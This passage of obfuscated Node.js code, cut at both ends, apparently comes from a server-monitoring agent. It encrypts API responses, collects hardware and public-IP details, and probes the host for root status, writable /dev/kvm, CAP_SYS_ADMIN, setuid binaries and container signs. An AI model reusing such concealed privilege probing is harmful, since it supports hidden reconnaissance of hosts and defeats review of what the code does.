            'COWcX': '/api/fileraw',
            'ycktK': df(0xbba),
            'YvulF': df(0x385),
            'JmbbA': 'hex',
            'ISpjO': function (d, f) {
                return d === f;
            },
            'GzJnh': df(0x734),
            'fUjWP': function (d, f) {
                return d === f;
            },
            'bYoYm': df(0x3d2),
            'aKlly': df(0x7be),
            'BAQdW': df(0xd33),
            'eUoqm': function (d, f) {
                return d === f;
            },
            'UsrEk': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const dg = df, h = {
                'ngAsa': c[dg(0x66a)],
                'vwxbe': c['CaFBE'],
                'zEPoS': c[dg(0xb5d)],
                'iaVoh': c[dg(0x5cb)],
                'egfmD': c['jbcaX'],
                'yteIw': function (o, p) {
                    return o === p;
                },
                'XDFog': function (o, p) {
                    const dh = dg;
                    return c[dh(0x97a)](o, p);
                },
                'PEngk': c[dg(0x8ca)],
                'jEmhs': function (o, p) {
                    return o === p;
                },
                'bBXqR': c['FwuEx'],
                'FBOtd': function (o, p) {
                    const di = dg;
                    return c[di(0xc52)](o, p);
                },
                'AHCun': c[dg(0x7eb)],
                'TUcqj': dg(0x7be),
                'VugfI': c['eByLd']
            };
        if (d[dg(0x5b0)][dg(0x6ec)](dg(0x1fa)))
            return c[dg(0x5ee)](g);
        const i = f['send'];
        f[dg(0x4db)] = function (o) {
            const dj = dg;
            if (a0P[dj(0x708)]) {
                const p = typeof o === dj(0x36e) ? o : Buffer['isBuffer'](o) ? o : JSON[dj(0x8f7)](o);
                return f[dj(0x9fe)](h['ngAsa'], h[dj(0x388)]), f[dj(0x9fe)](h['zEPoS'], Buffer[dj(0x2a8)](p)[dj(0xa3c)]()), i['call'](this, p);
            }
            if (f['get'](dj(0x2ff)) && f[dj(0x5f2)](h['iaVoh'])[dj(0x38b)](h[dj(0xc69)]))
                try {
                    if (d['is_authenticated']) {
                        let q;
                        if (h['yteIw'](d[dj(0x5b0)], dj(0x77b))) {
                            const r = h['XDFog'](typeof o, h[dj(0xd5a)]) ? JSON[dj(0xcf1)](o) : o;
                            let s = null;
                            h['jEmhs'](d[dj(0x792)], h[dj(0x514)]) && b && (s = b[dj(0x751)]());
                            const t = a[dj(0x9eb)](r, s);
                            q = h[dj(0x346)](typeof t, h[dj(0xd5a)]) ? t : JSON[dj(0x8f7)](t);
                        } else {
                            const u = Buffer[dj(0xb1d)](o) ? o : typeof o === dj(0x36e) ? Buffer[dj(0x581)](o, h['AHCun']) : Buffer[dj(0x581)](JSON[dj(0x8f7)](o), dj(0x1bc));
                            q = a[dj(0x872)](u, Buffer[dj(0x581)](a0P[dj(0x680)], h[dj(0x9fd)]));
                        }
                        return f[dj(0x9fe)](h['ngAsa'], h[dj(0x4d6)]), f[dj(0x9fe)](dj(0xa76), a0P[dj(0xc9f)]), f[dj(0x9fe)](h[dj(0x56d)], Buffer[dj(0x2a8)](q, h[dj(0xcd4)])[dj(0xa3c)]()), i[dj(0xc6a)](this, q);
                    } else {
                        const v = h[dj(0xaeb)](typeof o, h[dj(0xd5a)]) ? o : JSON[dj(0x8f7)](o);
                        return f[dj(0x9fe)](h[dj(0x56d)], Buffer['byteLength'](v, h[dj(0xcd4)])['toString']()), i[dj(0xc6a)](this, v);
                    }
                } catch (w) {
                    if (!f[dj(0xabc)]) {
                        const x = JSON[dj(0x8f7)]({ 'error': 'Response\x20encryption\x20failed:\x20' + w[dj(0x1f1)] });
                        return f[dj(0x8ab)](0x1f4), f[dj(0x9fe)](h[dj(0xd7e)], h[dj(0xc69)]), f[dj(0x9fe)](h['zEPoS'], Buffer[dj(0x2a8)](x, dj(0x1bc))['toString']()), i[dj(0xc6a)](this, x);
                    }
                    throw w;
                }
            return i[dj(0xc6a)](this, o);
        };
        const j = f[dg(0xb3a)];
        f['end'] = function (...o) {
            const dk = dg;
            return a0P['DEBUG'] && !f[dk(0x5f2)](dk(0xc85)) && f[dk(0x9fe)](c[dk(0x66a)], dk(0x8a8)), j[dk(0x796)](this, o);
        };
        if (c['pjogn'](d['method'], c[dg(0x375)]) || c['pjogn'](d['method'], c['UMBJy']))
            return a0P[dg(0x708)] && f['set'](c[dg(0x66a)], c[dg(0x73e)]), g();
        d[dg(0x484)] = ![];
        const k = [
            c[dg(0x4af)],
            c[dg(0xc99)]
        ];
        if (a0P[dg(0x708)])
            return d['is_authenticated'] = !![], c[dg(0x361)](g);
        const l = d[dg(0x48d)][c[dg(0xdb3)]] || d[dg(0x48d)][c['XbIKi']], m = d[dg(0x48d)][c['KytDo']] || d['headers'][c[dg(0x963)]], n = d['headers'][c[dg(0x52f)]] || d[dg(0x48d)][c[dg(0x4b5)]];
        if (!l || !m || !n)
            return k['includes'](d[dg(0x5b0)]) ? c[dg(0x279)](g) : f[dg(0x8ab)](0x191)[dg(0x69a)]({ 'error': c[dg(0xda1)] });
        try {
            let o = Buffer[dg(0x9b5)](0x0);
            if (d[dg(0x5b0)] !== c[dg(0x84d)]) {
                if (Buffer[dg(0xb1d)](d[dg(0x274)]))
                    o = d[dg(0x274)];
                else {
                    if (c['LWIqR'](typeof d['body'], c[dg(0x8ca)]))
                        o = Buffer[dg(0x581)](d[dg(0x274)], c['ycktK']);
                }
            }
            const p = o[dg(0xcfc)] > 0x0 ? a0k[dg(0x631)](c[dg(0x7ab)])['update'](o)[dg(0x3a0)](c[dg(0x816)]) : '', q = b ? b[dg(0x63b)]() : null, r = a[dg(0xa62)](d['method'], d[dg(0x5b0)], p, l, m, n, q);
            d[dg(0x484)] = !![], d['key_source'] = c[dg(0xb96)](r, c['FwuEx']) ? c['FwuEx'] : c['GzJnh'];
        } catch (s) {
            return k[dg(0x38b)](d[dg(0x5b0)]) ? c[dg(0x5ee)](g) : f[dg(0x8ab)](0x191)[dg(0x69a)]({ 'error': dg(0xc4c) + s[dg(0x1f1)] });
        }
        if (d[dg(0x274)] && c[dg(0x865)](typeof d[dg(0x274)], c['fMbPW'])) {
            const t = c['pjogn']((d[dg(0x48d)][c[dg(0xb15)]] || '')['toLowerCase'](), dg(0x8da));
            try {
                if (t && d[dg(0x484)]) {
                    const u = Buffer[dg(0x581)](a0P[dg(0x680)], c[dg(0x609)]), v = a[dg(0xb53)](d[dg(0x274)], u);
                    d['body'] = JSON[dg(0xcf1)](v);
                } else {
                    if (d['body'][dg(0x6ec)](c[dg(0x399)])) {
                        const w = Buffer[dg(0x581)](d[dg(0x274)], c[dg(0x609)])['toString'](c[dg(0xd9c)]);
                        d[dg(0x274)] = JSON['parse'](w);
                    } else {
                        if (d[dg(0x274)][dg(0x7e4)]()[dg(0x6ec)]('{') || d[dg(0x274)]['trim']()[dg(0x6ec)]('['))
                            d[dg(0x274)] = JSON['parse'](d[dg(0x274)]);
                        else {
                            if (c[dg(0xa27)](d[dg(0x274)][dg(0x7e4)](), ''))
                                d['body'] = {};
                        }
                    }
                }
            } catch (x) {
                return a0D[dg(0xbb0)](dg(0x331) + x[dg(0x1f1)]), f[dg(0x8ab)](0x190)[dg(0x69a)]({ 'error': dg(0xa6f) + x[dg(0x1f1)] });
            }
        }
        c[dg(0x841)](g);
    };
}
class a0a0 {
    constructor() {
        const dl = a0c4, a = {
                'dgxDB': function (b, c) {
                    return b / c;
                }
            };
        this[dl(0x6bf)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[dl(0x1ec)] = 0x0, this[dl(0xcce)] = 0x0, this[dl(0x2b7)] = a[dl(0x935)](Date[dl(0x2a3)](), 0x3e8);
    }
    async [a0c4(0xc74)]() {
        const dm = a0c4, a = {
                'qlqAa': dm(0xd3a),
                'JChHg': dm(0x1bc),
                'lxvWV': function (d, f) {
                    return d === f;
                },
                'PqDei': dm(0x23e),
                'nqnhS': function (d, f, g) {
                    return d(f, g);
                },
                'OogRx': '/sys/fs/cgroup/memory.current',
                'FXEoI': dm(0xb32),
                'wThlD': dm(0x416),
                'pYUHt': function (d, f) {
                    return d > f;
                },
                'PFTMQ': function (d, f) {
                    return d(f);
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[dm(0x1db)](a[dm(0xada)], a[dm(0xadf)]))[dm(0x7e4)]();
            b = a[dm(0x707)](d, a['PqDei']) ? null : parseInt(d, 0xa), c = a['nqnhS'](parseInt, (await a0m[dm(0x1db)](a[dm(0x6d7)], a[dm(0xadf)]))[dm(0x7e4)](), 0xa);
        } catch {
            try {
                b = parseInt((await a0m[dm(0x1db)](a['FXEoI'], a[dm(0xadf)]))[dm(0x7e4)](), 0xa), c = a[dm(0xba5)](parseInt, (await a0m['readFile'](a['wThlD'], dm(0x1bc)))[dm(0x7e4)](), 0xa);
                if (a[dm(0x61f)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u[dm(0x6cb)]();
                b = f['total'], c = f[dm(0x7b0)];
            }
        }
        if (b === null) {
            const g = await a0u['mem']();
            b = g[dm(0xb5f)], (a[dm(0x707)](c, null) || a['PFTMQ'](isNaN, c)) && (c = g['used']);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const dn = a0c4, a = await this[dn(0x517)](), b = await this[dn(0xcc7)](a[dn(0xd71)]), c = await this[dn(0x698)](), d = a0a0['assembleBaseInfo'](a, b, c);
        return a0D['debug'](dn(0x477) + JSON[dn(0x8f7)](d, null, 0x2), 0x1), d;
    }
    static [a0c4(0x9a5)](a, b, c) {
        const dp = a0c4;
        return {
            'arch': a[dp(0xa25)],
            'cpu_cores': a[dp(0x944)],
            'cpu_name': a['cpu_name'],
            'disk_total': b[dp(0xc37)],
            'gpu_name': a[dp(0x430)],
            'ipv4': c[dp(0x9f7)] ?? null,
            'ipv6': c[dp(0x94f)] ?? null,
            'mem_total': b[dp(0x3a3)],
            'os': a['os'],
            'kernel_version': a['kernel_version'],
            'swap_total': b[dp(0x1a0)],
            'version': a['version'],
            'virtualization': a[dp(0xd71)],
            'marks': Array[dp(0xb8b)](a[dp(0xc53)]) ? [...a['marks']] : []
        };
    }
    static ['staticFallback']() {
        const dq = a0c4;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0P[dq(0xc9f)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0c4(0x21d)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static ['netFallback']() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async [a0c4(0x517)]() {
        const dr = a0c4;
        let a = {}, b = {};
        try {
            a = await a0u['cpu']();
        } catch (d) {
            a0D[dr(0x354)]('获取\x20CPU\x20信息失败:\x20' + d[dr(0x1f1)], 0x1);
        }
        try {
            b = await a0u[dr(0xae6)]();
        } catch (f) {
            a0D['debug'](dr(0x990) + f[dr(0x1f1)], 0x1);
        }
        let c = '';
        try {
            c = await this['_getVirtualization']();
        } catch (g) {
            a0D[dr(0x354)]('获取虚拟化信息失败:\x20' + g[dr(0x1f1)], 0x1);
        }
        return {
            'arch': a0p['arch']() || '',
            'cpu_cores': a[dr(0x37c)] || 0x0,
            'cpu_name': a[dr(0x3a1)] || '',
            'gpu_name': '',
            'os': ((b[dr(0x54e)] || '') + '\x20' + (b[dr(0x9da)] || ''))['trim'](),
            'kernel_version': b[dr(0xc20)] || '',
            'version': a0P['AGENT_VERSION'],
            'virtualization': c,
            'marks': this[dr(0x9e5)]()
        };
    }
    async [a0c4(0xcc7)](a) {
        const ds = a0c4;
        let b = 0x0;
        try {
            b = (await a0u['fsSize']())[0x0]?.[ds(0x9e0)] || 0x0;
        } catch (d) {
            a0D[ds(0x354)](ds(0x7ff) + d['message'], 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[ds(0xc74)]() || c;
        } catch (f) {
            a0D['debug'](ds(0xa80) + f[ds(0x1f1)], 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[ds(0xb5f)] || 0x0,
            'swap_total': c[ds(0xd8d)] || 0x0
        };
    }
    async [a0c4(0x698)]() {
        const dt = a0c4, a = {
                'iGhCG': function (d, f) {
                    return d === f;
                },
                'BCmqx': dt(0x70b),
                'jCuCi': dt(0x1fb)
            }, [b, c] = await Promise[dt(0x76b)]([
                this[dt(0x3c9)](),
                this['getPublicIpV6']()
            ]);
        if (a[dt(0x494)](b['status'], a[dt(0x8db)]))
            a0D[dt(0x354)](dt(0xd1d) + b[dt(0x6ac)], 0x1);
        if (a[dt(0x494)](c[dt(0x8ab)], a[dt(0x8db)]))
            a0D[dt(0x354)](dt(0x677) + c['reason'], 0x1);
        return {
            'ipv4': b['status'] === dt(0x1fb) ? b['value'] : null,
            'ipv6': a['iGhCG'](c[dt(0x8ab)], a[dt(0x8f6)]) ? c[dt(0x42b)] : null
        };
    }
    static [a0c4(0x284)] = a0c4(0x26f);
    static [a0c4(0x2e7)] = '/dev';
    static [a0c4(0x9f9)] = '/etc';
    static [a0c4(0x4d4)] = a0c4(0xacf);
    static [a0c4(0xdbc)] = '/';
    [a0c4(0x9e5)]() {
        const du = a0c4, a = {
                'bXxSm': function (d, f) {
                    return d !== f;
                },
                'CEMJt': du(0xa08),
                'ETDkn': du(0xa15),
                'xGEUM': du(0x48b),
                'HKIQs': du(0x5a6),
                'INTuA': du(0x32c),
                'iNMum': du(0xaa8),
                'sCUDF': '(none)'
            };
        if (a[du(0x4f2)](process[du(0x2fb)], a['CEMJt']))
            return [];
        const b = [], c = [
                [
                    a['ETDkn'],
                    () => this[du(0x4d0)]()
                ],
                [
                    a[du(0x38f)],
                    () => this[du(0xc9e)]()
                ],
                [
                    a[du(0x882)],
                    () => this[du(0x4a5)]()
                ],
                [
                    a[du(0x7a7)],
                    () => this[du(0x666)]()
                ],
                [
                    a[du(0x4ae)],
                    () => this[du(0xb43)]()
                ]
            ];
        for (const [d, f] of c) {
            try {
                if (f())
                    b[du(0x21f)](d);
            } catch (g) {
                a0D[du(0x354)](du(0x9e6) + d + ']:\x20' + g[du(0x1f1)], 0x1);
            }
        }
        return a0D[du(0x354)](du(0x589) + (b['join'](',') || a[du(0x8a3)]), 0x1), b;
    }
    ['_markRoot']() {
        const dv = a0c4, a = {
                'OrXPA': function (b, c) {
                    return b !== c;
                },
                'BcpyS': dv(0xacb),
                'EuHie': function (b, c) {
                    return b === c;
                }
            };
        if (a[dv(0xa69)](typeof process[dv(0x6b1)], dv(0xacb)) || a[dv(0xa69)](typeof process[dv(0xb17)], a[dv(0x506)]))
            return ![];
        return a[dv(0x818)](process[dv(0x6b1)](), 0x0) && process['getegid']() === 0x0;
    }
    [a0c4(0xc9e)]() {
        const dw = a0c4, a = { 'xkCSC': 'kvm' };
        return a0a0[dw(0xa3e)](a0o['join'](a0a0['MARKS_DEV_ROOT'], a[dw(0xcbf)]), 0xa, 0xe8);
    }
    [a0c4(0xb43)]() {
        const dx = a0c4, a = {
                'tQJAv': dx(0xaa8),
                'WZJjA': dx(0xc60),
                'plJKl': dx(0x815),
                'ITopC': function (b, c) {
                    return b & c;
                }
            };
        if (!a0a0['_charDeviceRW'](a0o[dx(0x6e5)](a0a0[dx(0x2e7)], a[dx(0x2ac)]), 0xa, 0xe5))
            return ![];
        if (this['_capEffBit'](0x15))
            return !![];
        for (const b of [
                a['WZJjA'],
                dx(0x750),
                dx(0x471),
                a['plJKl']
            ]) {
            try {
                const c = a0l[dx(0x4c6)](a0o[dx(0x6e5)](a0a0[dx(0xdbc)], b));
                if (c['isFile']() && a['ITopC'](c[dx(0xa9a)], 0x800) && c['mode'] & 0x49)
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    [a0c4(0x4a5)]() {
        const dy = a0c4, a = {
                'FjbFc': dy(0x489),
                'Nujnn': dy(0x2a4),
                'jHEgT': dy(0x1bc),
                'fSGfZ': 'hostname',
                'VFyCo': dy(0x2df),
                'yfirR': 'container',
                'imxpw': dy(0xacb),
                'sXeDg': function (g, h) {
                    return g > h;
                },
                'fdkUB': function (g, h) {
                    return g(h);
                },
                'psarF': dy(0x1fc)
            };
        if (a0a0['_fileContains'](a0o[dy(0x6e5)](a0a0['MARKS_PROC_ROOT'], dy(0x923), a[dy(0x67f)]), Buffer[dy(0x581)](dy(0x98c))))
            return !![];
        for (const g of [
                dy(0x923),
                '1'
            ]) {
            const h = a0a0[dy(0x9c0)](a0o[dy(0x6e5)](a0a0[dy(0x284)], g, a[dy(0xc77)]));
            if (!h)
                continue;
            const i = h[dy(0xa3c)](a['jHEgT'])[dy(0x3ff)]('\x00'), j = i[dy(0x3dd)](l => l[dy(0x6ec)](dy(0xbf5))), k = i['some'](l => l[dy(0x6ec)](dy(0x478)));
            if (j && k)
                return !![];
        }
        const b = a0a0['_readLimited'](a0o[dy(0x6e5)](a0a0[dy(0x9f9)], a[dy(0x618)]));
        if (!b)
            return ![];
        const c = b[dy(0xa3c)](a['jHEgT'])[dy(0x7e4)]()[dy(0xc48)]();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/[dy(0x1d0)](c))
            return ![];
        try {
            if (!a0l[dy(0x4c6)](a0o[dy(0x6e5)](a0a0[dy(0xdbc)], a[dy(0xca1)], a[dy(0xbad)]))[dy(0x39a)]())
                return ![];
        } catch {
            return ![];
        }
        if (typeof process[dy(0x6b1)] !== a['imxpw'])
            return ![];
        const d = process['geteuid'](), f = a0a0[dy(0x9c0)](a0o[dy(0x6e5)](a0a0[dy(0x9f9)], 'passwd'));
        if (!f)
            return ![];
        for (const l of f[dy(0xa3c)](a[dy(0x956)])['split']('\x0a')) {
            const m = l[dy(0x3ff)](':');
            if (a[dy(0x9ed)](m[dy(0xcfc)], 0x2) && a[dy(0x6fe)](Number, m[0x2]) === d)
                return ![];
        }
        return a0l[dy(0xc2f)](a0o[dy(0x6e5)](a0a0[dy(0xdbc)], a[dy(0x6d9)])) || a0l[dy(0xc2f)](a0o['join'](a0a0[dy(0x4d4)], dy(0x4c0)));
    }
    ['_markSystemd']() {
        const dz = a0c4, a = {
                'GktsC': dz(0x97d),
                'WSwAg': dz(0x32c),
                'jCiEq': dz(0x7fa),
                'uuwsG': dz(0x293),
                'mWvWS': dz(0xaa6),
                'CTSuH': dz(0xdb4),
                'vdkWO': dz(0xbcc)
            };
        try {
            if (!a0l[dz(0x4c6)](a0o['join'](a0a0[dz(0x4d4)], dz(0x32c), a[dz(0xd35)]))[dz(0x39a)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l[dz(0xc2f)](a0o[dz(0x6e5)](a0a0['MARKS_RUN_ROOT'], a[dz(0x9d5)], a[dz(0x46a)])) && !a0l[dz(0xc2f)](a0o[dz(0x6e5)](a0a0['MARKS_RUN_ROOT'], a[dz(0x3bb)], a[dz(0x8b4)])))
            return ![];
        if (!a0a0[dz(0xc8b)]())
            return ![];
        const b = a0a0[dz(0x9c0)](a0o['join'](a0a0[dz(0x284)], '1', a[dz(0x343)]));
        if (b) {
            const c = b['toString'](dz(0x1bc))[dz(0x7e4)]();
            if (c)
                return c['toLowerCase']()[dz(0x38b)](a[dz(0x9d5)]);
        }
        try {
            const d = a0l[dz(0x9e9)](a0o[dz(0x6e5)](a0a0[dz(0x284)], '1', a[dz(0x66e)]));
            if (d && !a0o['basename'](d)[dz(0xc48)]()['includes']('systemd'))
                return ![];
        } catch {
        }
        return !![];
    }
    [a0c4(0x8ad)](a) {
        const dA = a0c4, b = {
                'FGlQN': dA(0x923),
                'sqMVI': dA(0x1bc),
                'FKbJG': dA(0x49b),
                'TPckx': function (d, f) {
                    return d === f;
                },
                'NGegS': function (d, f) {
                    return d & f;
                },
                'QOkCw': function (d, f) {
                    return d(f);
                },
                'oBjhe': function (d, f) {
                    return d + f;
                },
                'ggWYY': function (d, f) {
                    return d(f);
                }
            }, c = a0a0['_readLimited'](a0o[dA(0x6e5)](a0a0[dA(0x284)], b['FGlQN'], dA(0x8ab)));
        if (!c)
            return ![];
        for (const d of c['toString'](b[dA(0xcf9)])[dA(0x3ff)]('\x0a')) {
            if (d[dA(0x6ec)](b['FKbJG'])) {
                const f = d[dA(0x3ff)](/\s+/);
                if (f['length'] < 0x2)
                    return ![];
                try {
                    return b[dA(0xb5b)](b[dA(0x763)](b[dA(0x8a5)](BigInt, b[dA(0x92c)]('0x', f[0x1])) >> b[dA(0x7e7)](BigInt, a), 0x1n), 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0c4(0xc8b)]() {
        const dB = a0c4, a = {
                'YpMKf': dB(0x400),
                'yBGDc': dB(0x54d),
                'UmIEf': 'usr/local/bin/systemctl'
            };
        for (const b of [
                a['YpMKf'],
                a[dB(0x641)],
                a[dB(0x1a7)]
            ]) {
            if (a0a0['_executable'](a0o[dB(0x6e5)](a0a0[dB(0xdbc)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[dB(0x3ff)](a0o['delimiter'])) {
            if (c && a0a0[dB(0x5df)](a0o[dB(0x6e5)](c, dB(0x9ad))))
                return !![];
        }
        return ![];
    }
    static [a0c4(0x5df)](a) {
        const dC = a0c4, b = {
                'ZzhUl': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[dC(0x4c6)](a);
            return c['isFile']() && b[dC(0xab9)](c[dC(0xa9a)], 0x49) !== 0x0;
        } catch {
            return ![];
        }
    }
    static [a0c4(0xa3e)](a, b, c) {
        const dD = a0c4, d = {
                'NMCcK': function (f, g) {
                    return f !== g;
                },
                'pJHku': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l[dD(0x4c6)](a);
            if (!f[dD(0x28e)]())
                return ![];
            if (d[dD(0xc5a)](a0a0[dD(0x94d)](f[dD(0xbda)]), b) || d[dD(0x92a)](a0a0[dD(0x468)](f[dD(0xbda)]), c))
                return ![];
            const g = a0l[dD(0x45b)](a, 'r+');
            try {
                return !![];
            } finally {
                a0l['closeSync'](g);
            }
        } catch {
            return ![];
        }
    }
    static ['_devMajor'](a) {
        const dE = a0c4, b = {
                'JkDuZ': function (f, g) {
                    return f % g;
                },
                'vIAyI': function (f, g) {
                    return f / g;
                },
                'enhsN': function (f, g) {
                    return f / g;
                },
                'koATy': function (f, g) {
                    return f & g;
                }
            }, c = b['JkDuZ'](Math[dE(0x5c2)](b[dE(0x6b0)](a, 0x100)), 0x1000), d = Math['floor'](b[dE(0x26a)](a, 0x100000000));
        return (c | b['koATy'](d, ~0xfff)) >>> 0x0;
    }
    static [a0c4(0x468)](a) {
        const dF = a0c4, b = {
                'DqePL': function (f, g) {
                    return f % g;
                },
                'mqtGo': function (f, g) {
                    return f & g;
                },
                'XdleT': function (f, g) {
                    return f % g;
                },
                'fNWWj': function (f, g) {
                    return f >>> g;
                }
            }, c = b[dF(0xbf7)](a, 0x100), d = b[dF(0x276)](b[dF(0x519)](Math[dF(0x5c2)](a / 0x1000), 0x100000), 0xfff00);
        return b[dF(0xa8b)](c | d, 0x0);
    }
    static [a0c4(0x9c0)](a, b = 0x400 * 0x400) {
        const dG = a0c4, c = {
                'ekOnQ': function (f, g) {
                    return f - g;
                }
            };
        let d = null;
        try {
            d = a0l[dG(0x45b)](a, 'r');
            const f = Buffer['alloc'](0x2000), g = [];
            let h = 0x0;
            while (h < b) {
                const i = a0l[dG(0x88d)](d, f, 0x0, Math[dG(0x61d)](f[dG(0xcfc)], c[dG(0xcf2)](b, h)), null);
                if (!i)
                    break;
                g[dG(0x21f)](Buffer[dG(0x581)](f['subarray'](0x0, i))), h += i;
            }
            return Buffer['concat'](g);
        } catch {
            return null;
        } finally {
            if (d !== null)
                try {
                    a0l[dG(0x372)](d);
                } catch {
                }
        }
    }
    static [a0c4(0xa6b)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const dH = a0c4, f = {
                'AcKyn': function (h, i) {
                    return h - i;
                },
                'aFFzj': function (h, i) {
                    return h - i;
                },
                'yLVnv': function (h, i) {
                    return h !== i;
                },
                'JZMLw': function (h, i) {
                    return h - i;
                }
            };
        let g = null;
        try {
            g = a0l[dH(0x45b)](a, 'r');
            const h = Math[dH(0x23e)](0x0, f[dH(0xd8c)](b['length'], 0x1)), i = Buffer[dH(0x9b5)](d);
            let j = Buffer['alloc'](0x0), k = 0x0;
            while (k < c) {
                const l = a0l[dH(0x88d)](g, i, 0x0, Math[dH(0x61d)](d, f[dH(0x731)](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer['concat']([
                    j,
                    i[dH(0xd15)](0x0, l)
                ]);
                if (f[dH(0x6b5)](m[dH(0x7b2)](b), -0x1))
                    return !![];
                j = h ? Buffer[dH(0x581)](m[dH(0xd15)](Math[dH(0x23e)](0x0, f[dH(0x780)](m[dH(0xcfc)], h)))) : Buffer[dH(0x9b5)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f[dH(0x6b5)](g, null))
                try {
                    a0l[dH(0x372)](g);
                } catch {
                }
        }
    }
    [a0c4(0x47e)]() {
        const dI = a0c4, a = {
                'fPBqr': function (c, d) {
                    return c === d;
                },
                'moGol': dI(0x575)
            }, b = a0p[dI(0xb16)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[dI(0x8f4)](d[dI(0x2da)], a[dI(0x33e)]) || d[dI(0x2da)] === 0x4;
                if (f && !d[dI(0xad7)]) {
                    if (!/^10\./[dI(0x1d0)](d[dI(0x7e8)]) && !/^192\.168\./[dI(0x1d0)](d[dI(0x7e8)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d['address']))
                        return d[dI(0x7e8)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const dJ = a0c4, a = {
                'AmmCO': 'https://checkip.amazonaws.com',
                'NtzyA': dJ(0x7fd),
                'WUEGn': dJ(0x5c3),
                'UDWTX': dJ(0x381)
            }, b = [
                dJ(0xbbb),
                dJ(0xd26),
                a[dJ(0xd99)],
                a[dJ(0xa44)],
                'https://ipecho.net/plain',
                a[dJ(0x838)],
                a[dJ(0x536)]
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this[dJ(0x54b)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[dJ(0x54b)](c))
            return c;
        return null;
    }
    [a0c4(0xc59)]() {
        const dK = a0c4, a = {
                'txdCg': function (c, d) {
                    return c === d;
                },
                'VqDYc': dK(0x34c),
                'IWnQY': dK(0x45c)
            }, b = a0p[dK(0xb16)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[dK(0x57e)](d[dK(0x2da)], a[dK(0x876)]) || d[dK(0x2da)] === 0x6;
                if (f && !d[dK(0xad7)]) {
                    if (!d[dK(0x7e8)][dK(0xc48)]()[dK(0x6ec)](a[dK(0x593)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0c4(0x22f)]() {
        const dL = a0c4, a = {
                'KSkTH': 'https://icanhazip.com',
                'zXqSf': dL(0x393)
            }, b = this['getLocalIPv6']();
        if (b && this[dL(0x1b4)](b))
            return b;
        const c = [
            'https://api6.ipify.org',
            a[dL(0xa0c)],
            a[dL(0x687)]
        ];
        for (const d of c) {
            try {
                const f = await this[dL(0xc32)](d, 0x6);
                if (f && this['isValidIPv6'](f))
                    return f;
            } catch (g) {
                a0D[dL(0x354)](dL(0xb0d) + d + '\x20失败:\x20' + g[dL(0x1f1)]);
                continue;
            }
        }
        return null;
    }
    async [a0c4(0xc32)](a, b = 0x0) {
        const dM = a0c4, c = {
                'PbhLq': function (d, f) {
                    return d !== f;
                },
                'KPgXb': function (d, f) {
                    return d(f);
                },
                'qWXDG': function (d, f) {
                    return d(f);
                },
                'KLbTO': dM(0x883),
                'uQhEN': dM(0xbb0)
            };
        return new Promise((d, f) => {
            const dN = dM, g = c[dN(0x2cf)](require, 'https'), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c['KLbTO'] }
                }, i = g[dN(0x5f2)](a, h, j => {
                    const dO = dN;
                    let k = '';
                    if (c[dO(0xae0)](j[dO(0x5b8)], 0xc8)) {
                        c['KPgXb'](f, new Error('HTTP\x20' + j['statusCode']));
                        return;
                    }
                    j['on'](dO(0x369), l => k += l), j['on'](dO(0xb3a), () => d(k[dO(0x7e4)]()));
                });
            i['on'](c['uQhEN'], f), i['setTimeout'](0x1388, () => {
                const dP = dN;
                i[dP(0x4b0)](), f(new Error(dP(0xbfa)));
            });
        });
    }
    [a0c4(0x54b)](a) {
        const dQ = a0c4;
        return /^(\d{1,3}\.){3}\d{1,3}$/[dQ(0x1d0)](a);
    }
    [a0c4(0x1b4)](a) {
        const dR = a0c4;
        if (!/^[0-9a-fA-F:]+$/[dR(0x1d0)](a) || !a['includes'](':'))
            return ![];
        const b = a[dR(0x3ff)](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/['test'](b);
    }
    async [a0c4(0xb64)]() {
        const dS = a0c4, a = {
                'ksLQF': function (m, n) {
                    return m / n;
                },
                'PHCTy': function (m, n) {
                    return m - n;
                },
                'EnAbt': function (m, n) {
                    return m * n;
                },
                'OXSym': function (m, n) {
                    return m / n;
                },
                'EsXfK': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[dS(0xd94)]([
                a0u['currentLoad'](),
                a0u[dS(0x6cb)](),
                a0u[dS(0x88f)](),
                a0u[dS(0xbb5)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
